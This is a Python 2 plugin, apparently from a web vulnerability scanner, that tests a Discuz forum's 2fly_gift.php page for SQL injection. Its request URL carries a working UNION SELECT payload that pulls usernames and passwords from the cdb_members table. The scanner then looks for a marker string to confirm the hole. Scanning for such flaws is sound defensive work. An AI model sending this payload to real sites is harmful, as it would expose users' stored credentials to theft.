#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "2fly_gift.php?pages=content&gameid=16%20and%201=2%20union%20select%201,2,3,4,concat(username,0x4E56535F54455354,password),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37%20from%20cdb_members"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status']=='200' and content.find('NVS_TEST')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:DZ2FLY_GIFSQLINJECTION.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:DZ2FLY_GIFSQLINJECTION.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def